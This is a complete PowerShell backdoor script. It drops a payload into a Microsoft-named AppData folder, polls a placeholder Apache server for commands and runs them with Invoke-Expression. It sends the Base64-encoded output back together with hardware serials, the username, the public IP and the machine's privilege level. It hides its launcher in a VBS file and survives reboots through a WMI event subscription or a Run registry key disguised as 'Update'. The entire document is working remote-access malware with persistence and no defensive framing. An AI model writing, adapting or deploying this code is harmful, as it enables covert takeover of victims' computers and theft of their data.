# Set The Path To The Main File
$payloadPath = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"
if(!(Test-Path -Path $payloadPath)) {
	mkdir $payloadPath
}
$modulename = "$payloadPath\psscript.ps1"

# Main File Body
$scriptBody = @'
$verurl = 'http://YOUR-APACHE-SERVER/apache/script.txt' 
$url = 'http://YOUR-APACHE-SERVER/apache/'
$stop = 'destroy_shell_7$456&89'
$exec = 0

###### BASE 64 Functions ######
# Using UTF-8
function DecodeBase64($String) {
	$EncodedText = “$String”
	$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText))
	return $DecodedText
}
function EncodeBase64($String) {
	$Text = "$String"
	$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
	$EncodedText =[Convert]::ToBase64String($Bytes)
	return $EncodedText
}
### HTTP(S) Status Function ###
function GetUrlStatusCode([string] $Url) {
    try {(Invoke-WebRequest -Uri $Url -UseBasicParsing -DisableKeepAlive -Method head).StatusCode}
    catch [Net.WebException] {
        [int]$_.Exception.Response.StatusCode
    }
}

while($true) {
	if(GetUrlStatusCode $url) { # Run The Script Only If The Server Is Online
		###### start-sleep -seconds 0 ###### Change Me To 30
		$filecontent =(New-Object Net.WebClient).DownloadString($verurl)
		$filecontent = $filecontent.TrimEnd()

		$a = Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios = $a.split(' ')[2].Trim(); #bios id
		$b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
		$c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
		$ids = $id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
		$time=([System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), 'GTB Standard Time')).ToString('yyyyMMddHHmmss');
		$user = $env:USERNAME + "(" + $env:COMPUTERNAME + ")"
		$ip = (Invoke-WebRequest ifconfig.me/ip).Content

		if($filecontent -ne 'standby') {
			if($filecontent -eq $stop) {break}
			else {
				if($filecontent -ne $exec) {
					# Execute command from server and store the Output
					Invoke-Expression -Command $filecontent | Out-String -OutVariable Output
					Write-Host 'Command Executed!' -ForegroundColor green
					
					if($Output) {
						### Build and send Output back to server ###
						# Encode the Output to BASE64
						$Text = "$Output"
						$EncodedText = EncodeBase64($Text)

						# Build the Response
						$Response = "[RESPONSE] $ip $user $time $EncodedText"

						# Send the Output and log the STATUS CODE from the server's RESPONSE
						$Status = (Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "$Response").StatusCode #| Out-Null
						if($Status -lt 300) {Write-Host "[SERVER STATUS] $Status" -ForegroundColor green}
						else {Write-Host "[SERVER STATUS] $Status" -ForegroundColor red}
					}

					$exec = $filecontent
				}
			}
		}

		$elevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
		###### Uncomment this line ###### $localip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}).IPv4Address.IPAddress
		Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "[STATUS] $ids $ip $user $elevated $localip $time" | Out-Null

		if($exec -eq $filecontent) {
			Write-Host "[SCRIPT] " -f blue -nonewline; Write-Host "Command executed! Input another command or set script to standby";
			Start-Sleep -Seconds 5 # Increment If Needed
		}
		else {
			Write-Host "[SCRIPT] " -f blue -nonewline; Write-Host "Standing By";
			Start-Sleep -Seconds 5 # Increment If Needed
		}
	} else { # If The Server Is Offline
		Write-Host "[SERVER STATUS] OFFLINE" -ForegroundColor red
		Start-Sleep -Seconds 60
	}
}
'@;
# Set The Contents Of The Main File
Out-File -InputObject $scriptBody -Force $modulename

# Reboot Persistance Using VBS Files
$VBFileName = "vbscript.vbs"
$VBSFile = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\$VBFileName"
Write-Verbose "Writing VBScript to $VBSFile"
$VBSCode = "CreateObject(`"Wscript.Shell`").Run `"`"`"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`"`" -NoProfile -ExecutionPolicy Bypass -File `"`"$modulename`"`"`",0,True"
Out-File -InputObject $VBSCode -Force $VBSFile
		
$filterNS = "root\cimv2"
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
{
	# Query Taken From Matt's Code In PowerSploit.
	Write-Verbose "Creating reboot persistence. The payload executes on every computer restart"
	$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
				
	Write-Verbose "Creating a filter with name $filtername for executing $VBSFile."
	$filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
	$consumerPath = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{name=$filterName; ScriptFileName=$VBSFile; ScriptingEngine="VBScript"}
	Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
}
else {        
	Write-Verbose "Not running with elevated privileges. Using RUn regsitry key"
	New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $VBSFile -force
}

Invoke-Expression $modulename # Run The Main Function Code
